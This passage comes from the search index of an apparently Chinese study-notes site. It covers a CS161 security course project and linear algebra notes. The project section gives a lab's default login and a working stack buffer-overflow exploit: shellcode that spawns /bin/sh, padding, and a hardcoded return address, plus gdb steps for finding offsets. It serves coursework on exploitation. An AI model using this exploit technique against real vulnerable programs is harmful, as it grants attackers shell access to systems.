\u6765\u89e3\u51b3\u591a\u4e2a\u8fdb\u7a0b\u7684\u95ee\u9898</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#project","title":"project\u8e29\u5751\u8bb0\u5f55","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#project1","title":"project1","text":"<p>\u521d\u6b21\u767b\u5f55\u9700\u8981</p> <ul> <li>\u7528\u6237\u540d customizer</li> <li>\u5bc6\u7801 customizer</li> </ul> <p>\u7136\u540e\u4f1a\u7ed9\u51fa\u65b0\u7684\u767b\u5f55\u4fe1\u606f</p> <p>remus ans</p> <pre><code>#!/usr/bin/env python2\n\nshellcode = \"\\x6a\\x32\\x58\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x47\\x58\\xcd\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x54\\x5b\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80\"\n\nbuffercode = \"AAAAAAAAAAAAAAAAAAAA\"\n\naddresscode = \"\\x80\\xfc\\xff\\xbf\"\n\nprint(buffercode + addresscode + shellcode)\n</code></pre> <p>In this project, you will need to \u200b<code>chmod</code>\u200b\u200b any new scripts you create.</p> <ul> <li>shellcode \u662f\u6211\u4eec\u9700\u8981\u5b83\u6267\u884c\u7684\u2018\u6076\u610f\u2019\u4ee3\u7801</li> <li>addresscode \u662fshellcode\u7684\u5730\u5740 \u6211\u4eec\u7528addresscode \u66ff\u4ee3 rip \u4f7f\u5176\u8df3\u8f6c\u5230 shellcode</li> <li>buffercode \u662f\u7528\u6765\u8986\u76d6buffer\uff0csfp\uff0c\u4ee5\u53ca\u4e00\u4e9b\u5176\u5b83\u7684\u5185\u5bb9\uff0c\u5176\u6240\u9700\u8981\u66ff\u4ee3\u7684\u957f\u5ea6\u7b49\u9700\u8981\u5728gdp\u8c03\u8bd5\u4e2d\u67e5\u770b</li> </ul> <p>\u200b\u200b</p> <p>\u6211\u4eec\u901a\u8fc7\u67e5\u770bbuf\u9644\u8fd1\u7684\u6808\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230buf\u88ab\u5199\u5165\u4e868\u4e2aA\uff08\\x41\uff09\uff0c\u540c\u65f6\u6211\u4eec\u770b\u5230\u5b83\u7684\u9644\u8fd1\u6709\u4e00\u4e2a0xb7ffc4d3 \u7684\u503c\uff0c\u5bf9\u5e94\u4e86main\u51fd\u6570\u4e2dcall\u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u8bed\u53e5\uff0c\u5408\u7406\u63a8\u6d4b\u8fd9\u4e2a\u503c\u5c31\u662frip\u5185\u90e8\u7684\u503c\u3002\u6240\u4ee5rip\u7684\u5730\u5740\u53ef\u4ee5\u63a8\u6d4b\u5c31\u662f 0xbffffc78 + 4 = 0xbffffc7c</p> <p>\u6211\u4eec\u7684shellcode\u5e94\u5f53\u653e\u7f6e\u5728rip\u5730\u5740\u540e\u9762\uff0c\u4e5f\u5c31\u662f0xbffffc7c + 4 = 0xbffffc80 \uff0c\u56e0\u6b64\u8981\u5199\u5165\u7684addresscode \u5c31\u662f \u201c\\x80\\xfc\\xff\\xbf\u201d</p> <p>\u4ece\u4e0a\u56fe\u6211\u4eec\u4e5f\u53ef\u4ee5\u770b\u51fa\u4ecebuf\u5230rip\u4e2d\u95f4\u9700\u8981\u8986\u76d6\u7684\u957f\u5ea6\uff0c\u4e00\u5171\u9700\u898120\u4e2aA</p> <p>\u66f4\u7b80\u5355\u7684\u65b9\u5f0f\u662f\u4f7f\u7528info frame\u6307\u4ee4\uff0c\u67e5\u770b\u5f53\u524d\u51fd\u6570\u7684\u5806\u6808\u4fe1\u606f\uff1b\u7528x/16wx buf\u6307\u4ee4\u67e5\u770b\u5f53\u524dbuf\u7684\u4fe1\u606f\uff0c\u7ed3\u5408\u8d77\u6765\u5c31\u53ef\u4ee5\u4e86</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/math/Linear%20Algebra%20basic/","title":"Linear Algebra basic","text":"<p>\u542c3B1B\u505a\u7684\u7b14\u8bb0\uff0c\u6bd4\u8f83\u7c97\u7cd9\uff0c\u4e3a\u4e86\u5e94\u5bf9\u5206\u6d41\u9762\u8bd5\u901f\u6210\u7684\uff08\u867d\u7136\u6700\u540e\u4e5f\u6ca1\u54df\u4e2a\u4e0a\uff09</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/math/Linear%20Algebra%20basic/#1-vector","title":"1. vector","text":"<p>\u6709\u4e24\u79cd\u65b9\u6848\u6765\u7406\u89e3vector</p> <ul> <li>\u65b9\u5411\u548c\u957f\u5ea6\u7684\u96c6\u5408\uff08\u8d77\u70b9\u65e0\u5173\uff09</li> <li>\u6709\u5e8f\u6570\u5217 lists of numbers</li> </ul> <p>\u6570\u5b66\u4ee3\u8868\u7740\u6700\u5927\u7684\u62bd\u8c61\uff0c\u800c\u6570\u5b66\u4e0a\u7684\u5b9a\u4e49\u662f\uff0c\u5411\u91cf\u53ef\u4ee5\u4fdd\u8bc1\u4e24\u4e2a\u5411\u91cf\u76f8\u52a0\uff08\u5411\u91cf\u52a0\u6cd5\uff09\u548c\u6570\u5b57\u548c\u5411\u91cf\u76f8\u4e58\uff08\u5411\u91cf\u6570\u4e58\uff09\u662f\u6709\u610f\u4e49\u5373\u53ef</p> <p>\u800c\u5982\u4f55\u628a\u7bad\u5934\u548c\u6709\u5e8f\u6570\u5217\u7ed3\u5408\u8d77\u6765\uff0c\u6211\u4eec\u5c31\u9700\u8981\u5f15\u5165\u5750\u6807\u7cfb</p> <p></p> <p>\u5bf9\u4e8e\u6570\u4e58\uff0c\u6211\u4eec\u5f15\u5165\u6807\u91cf</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/math/Linear%20Algebra%20basic/#2","title":"2. \u7ebf\u6027\u7a7a\u95f4","text":"<p>\u5728\u8bb2\u89e3\u6211\u4eec\u7684vector\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5f15\u5165\u4e86\u5750\u6807\u7cfb\u8fd9\u4e2a\u6982\u5ff5\uff0c\u5176\u5b9e\u5750\u6807\u7cfb\u67d0\u79cd\u7a0b\u5ea6\u4e0a\u5c31\u6697\u793a\u4e86\u7ebf\u6027\u7a7a\u95f4\u8fd9\u4e2a\u6982\u5ff5</p> <p></p> <p>\u5bf9\u4e8e\u5750\u6807\u7cfb\uff0c\u6211\u4eec\u6709\u4e24\u4e2a\u5355\u4f4d\u5411\u91cf\uff0c\u5750\u6807\u7cfb\u4e2d\u7684\u6240\u6709\u7684\u5411\u91cf\u90fd\u53ef\u4ee5\u7531\u8fd9\u4e24\u4e2a\u5355\u4f4d\u5411\u91cf\u7ec4\u6210\uff0c\u5728\u5e73\u9762\u76f4\u89d2\u5750\u6807\u7cfb\u4e2d\uff0c\u8fd9\u4e24\u4e2a\u5411\u91cf\u88ab\u79f0\u4e3a\u662fbasis vector\u57fa\u5411\u91cf</p> <p>\u5f88\u663e\u7136\u7684\uff0c\u5bf9\u4e8e\u5e73\u9762\u76f4\u89d2\u5750\u6807\u7cfb\u800c\u8a00\uff0c\u5e76\u975e\u53ea\u6709\u4e0a\u56fe\u4e2d\u7684\u4e24\u4e2a\u5411\u91cf\u53ef\u4ee5\u7ec4\u6210basis vector\u3002\u4e8b\u5b9e\u4e0a\u800c\u8a00\uff0c\u5728\u5e73\u9762\u76f4\u89d2\u5750\u6807\u7cfb\u4e2d\u4efb\u9009\u4e24\u4e2a\u5411\u91cf\uff0c\u53ea\u8981\u4ed6\u4eec\u4e0d\u5171\u8fb9\uff0c\u5c31\u80fd\u591f\u7ec4\u6210basis vector</p> <p>\u6bcf\u5f53\u6211\u4eec\u7528list of numbers\u6765\u8868\u793a\u4e00\u4e2avector\u65f6\uff0c\u6211\u4eec\u6c38\u8fdc\u548c\u9009\u62e9\u7684basis vector\u76f8\u5173</p> <p></p> <p>span of these vectors \u8868\u793a\u8fd9\u4e9bvectors\u6240\u80fd\u6784\u6210\u7684\u7ebf\u6027\u7ec4\u5408linear combinations </p> <p>\u6839\u636e\u4e0a\u8ff0\u5b9a\u4e49\u6211\u4eec\u53ef\u4ee5\u63a8\u5bfc\u51fa\uff0c\u7531i\u548cj\u6784\u6210\u7684\u7ebf\u6027\u7a7a\u95f4\uff0c\u7ec4\u6210\u4e86\u5e73\u9762\u76f4\u89d2\u5750\u6807\u7cfb</p> <p>\u6211\u4eec\u5bf9\u4e8e\u5355\u4e2a\u5411\u91cf\u5f80\u5f80\u5c06\u5176\u770b\u6210\u7bad\u5934\uff0c\u5bf9\u4e8e\u591a\u4e2a\u5411\u91cf\u5f80\u5f80\u5c06\u5176\u770b\u6210\u4e00\u5806\u70b9 </p> <p>\u968f\u540e\u6211\u4eec\u53ef\u4ee5\u6269\u5c55\u7ef4\u5ea6\u7684\u6982\u5ff5\uff0c\u8df3\u51fa\u4e8c\u7ef4</p> <p></p> <p>\u5728\u4e09\u7ef4\u4e2d\uff0c\u663e\u7136\u4e24\u4e2a\u5411\u91cf\u7684\u7ebf\u6027\u7ec4\u5408\u65e0\u6cd5\u8986\u76d6\u7a7a\u95f4\u4e2d\u7684\u6240\u6709\u5411\u91cf\uff0c\u5f53\u6211\u4eec\u9009\u62e9\u7b2c\u4e09\u4e2a\u5411\u91cf\u4e2d\uff0c\u5982\u679c\u7b2c\u4e09\u4e2a\u5411\u91cf\u843d\u5230\u4e86\u524d\u4e24\u4e2a\u5411\u91cf\u7ec4\u6210\u7684\u9762\u4e0a\uff0c\u90a3\u4e48\u8fd9\u4e09\u4e2a\u5411\u91cf\u65e0\u6cd5\u6784\u6210\u8fd9\u4e2a\u7a7a\u95f4\u7684basis </p> <p>\u4f46\u662f\u5982\u679c\u7b2c\u4e09\u4e2a\u5411\u91cf\u6ca1\u6709\u843d\u5230\u8fd9\u4e2a\u9762\u4e0a\uff0c\u90a3\u4e48\u8fd9\u4e09\u4e2a\u5411\u91cf\u5219\u4f1a\u6784\u6210\u8fd9\u4e2a\u7a7a\u95f4\u7684basis</p> <p>\u4ece\u6211\u4eec\u7684\u76f4\u89c9\u4e0a\u6765\u770b\uff0c\u6211\u4eec\u9700\u8981\u7684\u65f6\u6bcf\u4e2a\u5411\u91cf\u90fd\u6709\u7528\uff0c\u800c\u4e0d\u662f\u67d0\u4e2a\u5411\u91cf\u53ef\u4ee5\u88ab\u5176\u4ed6\u5411\u91cf\u8868\u793a\u51fa\u6765\uff0c\u90a3\u4e48\u56e0\u6b64\u6211\u4eec\u6709\u5982\u4e0b\u5b9a\u4e49</p> <p>Linearly dependent: \u8868\u793a\u67d0\u4e2a\u5411\u91cfa\u53ef\u4ee5\u88ab\u4e00\u7ec4\u5411\u91cf\u7ebf\u6027\u7ec4\u5408 </p> <p></p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u7ebf\u6027\u7a7a\u95f4\u800c\u8a00\uff0c\u5982\u679c\u5176\u4e2d\u7684\u4e00\u7ec4\u5411\u91cf\u7ebf\u6027\u65e0\u5173\uff0c\u5e76\u4e14\u53ef\u4ee5\u5f20\u6210\u8fd9\u4e2a\u7a7a\u95f4\uff0c\u5373\u4e3a\u5176basis vector</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/math/Linear%20Algebra%20basic/#3","title":"3. \u77e9\u9635\u548c\u7ebf\u6027\u53d8\u6362","text":"<p>Linear transformation\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9\u4e8evector\u7684\u7279\u6b8a\u7684function\uff0c\u5176\u6709\u4ee5\u4e0b\u9650\u5236</p> <ul> <li>Lines remain lineas</li> <li>Origin remains fixed</li> </ul> <p>Linear transformation\u7684\u6027\u8d28\uff0c\u4fdd\u8bc1\u4e86\u4e00\u4e2a\u5411\u91cf\u76f8\u5bf9\u4e8ebasis vector\u7684\u7ed3\u679c\u662f\u4e0d\u53d8\u7684\uff0c\u6bd4\u5982x = 2a+3b\uff0c\u7ecf\u8fc7\u7ebf\u6027\u53d8\u5316\u4e4b\u540e\uff0c\u6211\u4eec\u53ea\u9700\u8981\u77e5\u9053\u7ebf\u6027\u53d8\u5316\u4e4b\u540e\u7684a\u548cb\u7684\u503c\uff0c\u5373\u53ef\u77e5\u9053x\u7684\u65b0\u503c</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u5411\u91cf\u505a\u7ebf\u6027\u53d8\u6362\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5173\u6ce8basis vector\u7684\u53d8\u5316\u5373\u53ef</p> <p></p> <p>\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u6211\u4eec\u5bf9\u4e8e\u4e8c\u7ef4\u5411\u91cf\u7684\u53d8\u6362\u65f6\u4e00\u4e2a2x2\u77e9\u9635\uff0c\u8fd9\u4e2a\u77e9\u9635\u5c31\u8574\u542b\u4e86\u5bf9\u4e8e\u539f\u672c\u7684\u4e8c\u7ef4\u5411\u91cf\u7684basis vector\u505a\u4e86\u4ec0\u4e48\u6837\u7684\u53d8\u6362</p> <p></p> <p>\u6bd4\u8f83\u7279\u6b8a\u7684\u60c5\u51b5\u662f\uff0c\u5047\u8bbe\u7684\u65b0\u7684\u201cbasis vector\u201d\u7ebf\u6027\u76f8\u5173\u4e86\uff0c\u5219\u4f1a\u5c06\u6574\u4e2a\u7a7a\u95f4\u7684\u5411\u91cf\u538b\u7f29\u5230\u4e00\u4e2a\u964d\u7ef4\u5ea6\u7684\u7a7a\u95f4\u4e2d</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/math/Linear%20Algebra%20basic/#4","title":"4. \u77e9\u9635\u4e58\u6cd5\u548c\u7ebf\u6027\u53d8\u6362\u590d\u5408","text":"<p>\u4e4b\u524d\u63d0\u5230\u77e9\u9635\u7684\u610f\u4e49\u5c31\u662f\u7ebf\u6027\u53d8\u6362\uff0c\u6709\u7684\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u628a\u4e00\u4e2a\u7ebf\u6027\u53d8\u6362\u62c6\u6210\u4e24\u4e2a\u8fc7\u7a0b\uff0c\u6bd4\u5982\u4e00\u4e2a\u65cb\u8f6c+\u4e00\u4e2a\u526a\u5207\uff0c\u8fd9\u79cd\u53d8\u6362\u5c31\u8868\u73b0\u4e3a\u4e24\u4e2a\u77e9\u9635\u7684\u4e58\u6cd5</p> <p></p> <p>\u77e9\u9635\u7684\u6b63\u786e\u7406\u89e3\u5176\u5b9e\u5e94\u8be5\u4ece\u53f3\u5411\u5de6\u8ba1\u7b97\uff0c\u5148\u8ba1\u7b97\u53f3\u8fb9\u7684\u7ebf\u6027\u53d8\u6362\uff0c\u518d\u8ba1\u7b97\u5de6\u8fb9\u7684\u7ebf\u6027\u53d8\u6362</p> <p></p> <p>\u4e24\u79cd\u53d8\u6362\u7684\u53e0\u52a0\u987a\u5e8f\u662f\u5b58\u5728\u533a\u522b\u7684\uff0c\u56e0\u6b64\u77e9\u9635\u4e58\u6cd5\u4e0d\u6ee1\u8db3\u4ea4\u6362\u5f8b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/math/Linear%20Algebra%20basic/#5","title":"5. \u884c\u5217\u5f0f","text":"<p>\u884c\u5217\u5f0f\u8861\u91cf\u4e00\u6b21\u7ebf\u6027\u53d8\u6362\u4e4b\u540e\uff0c\u5355\u4f4d\u7a7a\u95f4\u7684\u62c9\u4f38\u60c5\u51b5\uff0c\u6bd4\u5982\u4e0b\u9762\u8fd9\u4e2a\u60c5\u51b5\uff0c\u5355\u4f4d\u7a7a\u95f4\u5c31\u62c9\u4f38\u4e86\u4e00\u500d</p> <p></p> <p>\u5728\u8fd9\u4e2a\u60c5\u51b5\u4e0b\u62c9\u4f38\u4e866\u500d</p> <p></p> <p>\u5f53\u4f60\u53d1\u73b0\u884c\u5217\u5f0f\u7684\u6570\u503c\u4e3a0\u65f6\uff0c\u8bf4\u660e\u4ed6\u628a\u6240\u6709\u7684\u70b9\u90fd\u538b\u7f29\u5230\u4e86\u4e00\u6761\u7ebfor\u70b9\u4e0a</p> <p>\u8fd9\u4e2a\u6027\u8d28\u975e\u5e38\u91cd\u8981\uff0c\u5982\u679c\u884c\u5217\u5f0f\u4e3a0\uff0c\u8bf4\u660e\u4ed6\u628a\u7ebf\u6027\u7a7a\u95f4\u538b\u7f29\u5230\u4e86\u66f4\u5c0f\u7684\u7ef4\u5ea6\u4e0a\uff0c\u6bd4\u5982\u4e8c\u7ef4\u53d8\u6210\u4e00\u7ef4\u7684\u7ebf\uff0c\u751a\u81f3\u662f0\u7ef4\u7684\u70b9</p> <p>\u901a\u8fc7\u4e0a\u8ff0\u7684\u6570\u503c\u8ba1\u7b97\uff0c\u6211\u4eec\u5f88\u81ea\u7136\u4f1a\u53d1\u73b0\u6709\u8d1f\u6570\u7684\u884c\u5217\u5f0f\uff0c\u5176\u5b9e\u662f\u7a7a\u95f4\u5b9a\u5411\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u6bd4\u5982\u4e00\u5f20\u7eb8\u7684\u4e24\u9762\u8fdb\u884c\u4e86\u7ffb\u8f6c\uff0c\u5f62\u6210\u4e86\u6240\u8c13\u8d1f\u6570\u7684\u9762\u79ef\uff0c\u5176\u5b9e\u4f60\u53ef\u4ee5\u901a\u8fc7i\u548cj\u7684\u76f8\u5bf9\u4f4d\u7f6e\u6765\u5224\u65ad\u8fd9\u4e00\u70b9</p> <p></p> <p>\u5bf9\u4e8e\u4e09\u7ef4\u7ebf\u6027\u7a7a\u95f4\uff0c\u5f88\u663e\u7136\u7684\u5e94\u8be5\u7528\u4f53\u79ef\u53d8\u6362\u8868\u793a\u884c\u5217\u5f0f\u7684\u6982\u5ff5</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/math/Linear%20Algebra%20basic/#6","title":"6. \u9006\u77e9\u9635\uff0c\u5217\u7a7a\u95f4\u548c\u96f6\u7a7a\u95f4","text":"<p>\u9006\u77e9\u9635</p> <p></p> <p>\u7ebf\u6027\u4ee3\u6570\u53ef\u4ee5\u7528\u6765\u89e3\u51b3\u7ebf\u6027\u65b9\u7a0b\u7ec4\uff0c\u7ebf\u6027\u65b9\u7a0b\u7ec4\u7684\u542b\u4e49\u5176\u5b9e\u662f\uff0c\u627e\u5230\u4e00\u7ec4\u5411\u91cf\uff0c\u4f7f\u5176\u5728\u8fdb\u884c\u7ebf\u6027\u53d8\u6362\u4e4b\u540e\uff0c\u548c\u76ee\u6807\u5411\u91cf\u91cd\u5408</p> <p>\u5bf9\u4e8e\u884c\u5217\u5f0f\u4e0d\u4e3a0\u7684\u7ebf\u6027\u65b9\u7a0b\u7ec4\uff0c\u6211\u4eec\u603b\u80fd\u627e\u5230\u552f\u4e00\u7684\u89e3\uff0c\u4f7f\u5176\u7ebf\u6027\u53d8\u6362\u540e\u4e8e\u76ee\u6807\u5411\u91cf\u91cd\u5408\uff0c\u56e0\u4e3a\u5176\u5e76\u672a\u8fdb\u884c\u964d\u7ef4</p> <p>\u800c\u5f53\u6211\u4eec\u6c42\u89e3\u7684\u65f6\u5019\uff0c\u5b9e\u9645\u662f\u5728\u6c42\u7cfb\u6570\u77e9\u9635\u7684\u9006\u5411\u64cd\u4f5c</p> <p></p> <p>\u6240\u8c13\u7684\u9006\u5411\u77e9\u9635\u7684\u76f4\u89c2\u7ed3\u679c\uff0c\u5c31\u662f\u7ecf\u8fc7\u4e00\u4e2a\u7ebf\u6027\u53d8\u6362\u548c\u9006\u5411\u7ebf\u6027\u53d8\u6362\u4e4b\u540e\uff0c\u7ebf\u6027\u7a7a\u95f4\u4fdd\u6301\u4e0d\u53d8\uff0c\u4e5f\u5373 \\(A^{-1}A=\\) \u5355\u4f4d\u77e9\u9635</p> <p>\u4f46\u662f\u5f53\u884c\u5217\u5f0f\u4e3a0\u7684\u65f6\u5019\uff0c\u7a7a\u95f4\u88ab\u964d\u7ef4\u4e86\uff0c\u4e0d\u5b58\u5728\u5bf9\u5e94\u7684\u9006\u77e9\u9635\u53ef\u4ee5\u5347\u7ef4\uff0c\u76f4\u89c2\u7406\u89e3\u4e0a\uff0c\u77e9\u9635=\u7ebf\u6027\u53d8\u6362=\u51fd\u6570\uff0c\u51fd\u6570\u5f0f\u4e00\u4e00\u5bf9\u5e94\u7684\uff0c\u4f46\u662f\u5347\u7ef4\u884c\u4e3a\u662f\u8981\u4e00\u5bf9\u591a\u7684\u7ed3\u679c</p> <p></p> <p>\u4f46\u662f\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u4e0d\u5b58\u5728\u9006\u5411\u77e9\u9635\u4e0d\u7b49\u4e8e\u7ebf\u6027\u65b9\u7a0b\u7ec4\u4e0d\u5b58\u5728\u89e3\uff0c\u6bd4\u5982\u4f60\u964d\u7ef4\u4e4b\u540e\uff0c\u5bf9\u5e94\u7684\u5411\u91cf\u6070\u597d\u5728\u90a3\u6761\u7ebf\u4e0a</p> <p>\u79e9</p> <p>\u6211\u4eec\u5728\u964d\u7ef4\u8fd9\u4e2a\u8fc7\u7a0b\u4f1a\u53d1\u73b0\uff0c\u5bf9\u4e8e\u4e09\u7ef4\u7ebf\u6027\u7a7a\u95f4\uff0c\u6211\u53ef\u4ee5\u964d\u5230\u4e8c\u7ef4\uff0c\u4e5f\u53ef\u4ee5\u4e00\u7ef4\u548c0\u7ef4</p> <p>\u6211\u4eec\u5728\u7ebf\u6027\u4ee3\u6570\u4e2d\u7528rank\u6765\u8868\u793a\u8861\u91cf\u8fd9\u4e2a\u6570\u503c\uff0crank\u662f\u5bf9\u5e94\u77e9\u9635\u7684\uff0c\u8868\u793a\u7ebf\u6027\u53d8\u6362\u4e4b\u540e\u7684\u7a7a\u95f4\u7684\u7ef4\u6570</p> <p></p> <p>\u5982\u679c\u884c\u5217\u5f0f\u4e0d\u4e3a0\uff0c\u90a3\u4e48\u5176rank\u7b49\u4e8e\u77e9\u9635\u7684\u7ef4\u5ea6</p> <p>\u5217\u7a7a\u95f4</p> <p>\u6211\u4eec\u5c06\u77e9\u9635\u53d8\u6362\u5b8c\u6210\u4e4b\u540e\u7684\u7a7a\u95f4\u53eb\u505a\u5217\u7a7a\u95f4\uff0c\u56e0\u4e3a\u77e9\u9635\u7684\u5217\u8868\u793a\u4e86\u5bf9\u4e8e\u57fa\u5411\u91cf\u7684\u53d8\u6362\uff0c\u800c\u65b0\u7684\u57fa\u5411\u91cf\u8868\u793a\u4e86\u6574\u4e2a\u7ebf\u6027\u7a7a\u95f4</p> <p>rank\u662f\u5217\u7a7a\u95f4\u7684\u7ef4\u5ea6</p> <p>\u5982\u679crank\u548c\u5217\u6570\u76f8\u540c\uff0c\u79f0\u4e3afull rank</p> <p>\u96f6\u7a7a\u95f4</p> <p>\u662f\u6307\u90a3\u4e9b\u7ecf\u8fc7\u7ebf\u6027\u53d8\u6362\u4e4b\u540e\u8fdb\u5165\u539f\u70b9\u7684\u5411\u91cf</p> <p></p> <p>\u5982\u679c\u662f\u6ee1\u79e9\u7684\u7ebf\u6027\u53d8\u6362\uff0c\u5c31\u53ea\u6709\u539f\u70b9\u662f\u96f6\u7a7a\u95f4\uff0c\u5982\u679c\u662f\u964d\u7ef4\u7684\u7ebf\u6027\u53d8\u6362\uff0c\u90a3\u5c31\u6709\u4e00\u7cfb\u5217\u7684\u5411\u91cf\u6784\u6210\u96f6\u7a7a\u95f4</p> <p>\u975e\u65b9\u77e9\u9635</p> <p>\u975e\u65b9\u77e9\u9635\u7684\u542b\u4e49\u662f\u6211\u4eec\u5982\u679c\u975e\u8981\u505a\u5347\u7ef4or\u964d\u7ef4\u64cd\u4f5c\u7684\u7ed3\u679c</p> <p></p> <p>\u4f46\u662f\u5b9e\u9645\u4e0a\u6ca1\u6709\u8fdb\u884c\u4e86\u5347\u7ef4\uff0c\u867d\u7136\u6211\u4eec\u5c06\u89c6\u89d2\u8f6c\u6362\u6210\u4e86\u4e09\u7ef4\u7a7a\u95f4\uff0c\u4f46\u662f\u5176\u4ecd\u7136\u77e5\u8bc6\u4e09\u7ef4\u7a7a\u95f4\u7684\u4e00\u4e2a\u5e73\u9762</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/math/Linear%20Algebra%20basic/#7","title":"7. \u70b9\u79ef\u4e0e\u5bf9\u5076\u6027","text":"<p>\u70b9\u79ef\u5c31\u662f\u5c06\u4e24\u4e2a\u5411\u91cf\u9010\u4e2a\u5143\u7d20\u76f8\u4e58\uff0c\u5e76\u4e14\u52a0\u8d77\u6765\u3002\u4e5f\u53ef\u4ee5\u7406\u89e3\u4e3aa\u5411\u91cf\u5728b\u5411\u91cf\u4e0a\u7684\u6295\u5f71\uff0c\u518d\u548cb\u5411\u91cf\u4e58\u8d77\u6765</p> <p>\u5f88\u663e\u7136\uff0c\u70b9\u79ef\u662f\u987a\u5e8f\u65e0\u5173\u7684</p> <p>\u5bf9\u5076\u6027\u8868\u793a\u7684\u662f\uff0c\u4e24\u4e2a\u5411\u91cf\u76f8\u4e58\uff0c\u5e94\u5f53\u628a\u5176\u4e2d\u4e00\u4e2a\u5411\u91cf\u8f6c\u62101xN\u7684\u6a2a\u77e9\u9635\uff0c\u89c6\u4e3a\u4e00\u4e2a\u7ebf\u6027\u53d8\u6362</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/math/Linear%20Algebra%20basic/#8","title":"8. \u53c9\u79ef","text":"<p>\u53c9\u4e58\u8868\u793a\u4e3av\uff0cw\u4e24\u4e2a\u5411\u91cf\u6784\u6210\u7684\u5e73\u884c\u56db\u8fb9\u5f62\u7684\u9762\u79ef</p> <p>\u5176\u662f\u5b58\u5728\u65b9\u5411\u7684v\u5728w\u7684\u5de6\u4fa7\uff0c\u8868\u793a\u8d1f\u5411\u7684\u7ed3\u679c\uff0c\u5b9e\u9645\u4e0a\u7684\u7ed3\u679c\u662f\uff0c\u6211\u4eec\u5c06v\u4f5c\u4e3a\u7b2c\u4e00\u5217\uff0cw\u4f5c\u4e3a\u7b2c\u4e8c\u5217\uff0c\u7136\u540e\u8ba1\u7b97\u8fd9\u4e2a\u77e9\u9635\u7684\u884c\u5217\u5f0f</p> <p></p> <p>\u5f88\u76f4\u89c2\u7684\uff0c\u5176\u76f8\u5f53\u4e8e\u628ai\u548cj\u4e24\u4e2a\u5355\u4f4d\u57fa\u5411\u91cf\u8868\u793a\u7684\u5355\u4f4d\u7a7a\u95f4\uff0c\u8fdb\u884c\u7ebf\u6027\u53d8\u6362\u7684\u7ed3\u679c</p> <p>\u4f46\u662f\u5b9e\u9645\u4e0a\uff0c\u5728\u53c9\u4e58\u7684\u5b9e\u9645\u64cd\u4f5c\u4e2d\uff0c\u662f\u4e24\u4e2a\u4e09\u7ef4\u5411\u91cf\u4e58\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u4e2a\u65b0\u7684\u4e09\u7ef4\u5411\u91cf</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/math/Linear%20Algebra%20basic/#9","title":"9. \u57fa\u53d8\u6362","text":"<p>\u9006\u77e9\u9635\u7684\u6982\u5ff5\uff0c\u5c31\u662f\u9006\u5411\u7684\u7ebf\u6027\u53d8\u6362</p> <p></p> <p>M\u8868\u793a\u771f\u6b63\u7684\u53d8\u6362\uff0c\\(A^{-1}\\) \u548c \\(A\\) \u8868\u793a\u89c6\u89d2\u7684\u53d8\u6362bian'hu</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/math/Linear%20Algebra%20basic/#10","title":"10. \u7279\u5f81\u5411\u91cf\u548c\u7279\u5f81\u503c","text":"<p>\u5728\u90e8\u5206\u7ebf\u6027\u53d8\u6362\u4e2d\uff0c\u6709\u4e9b\u5411\u91cf\u6ca1\u6709\u53d8\u6362\u65b9\u5411\uff0c\u53ea\u662f\u53d8\u6362\u4e86\u957f\u5ea6</p> <p>\u4e5f\u5c31\u662f\u610f\u5473\u7740\u8fd9\u4e9b\u5411\u91cf\u4fdd\u7559\u5728\u4e86\u5f20\u6210\u7684\u7a7a\u95f4\u4e2d\uff0c\u548c\u4ed6\u4eec\u540c\u65b9\u5411\u7684\u6240\u6709\u5411\u91cf\uff0c\u90fd\u662f\u5982\u6b64</p> <p>\u8fd9\u4e9b\u5411\u91cf\u5c31\u662f\u6240\u8c13\u7684\u77e9\u9635\u7684\u7279\u5f81\u5411\u91cf\uff0c\u7279\u5f81\u503c\uff0c\u5c31\u662f\u8fd9\u4e00\u7cfb\u5217\u5411\u91cf\u5728\u8fd9\u4e2a\u64cd\u4f5c\u4e2d\u88ab\u62c9\u4f38\u4e86\u51e0\u500d</p> <p></p> 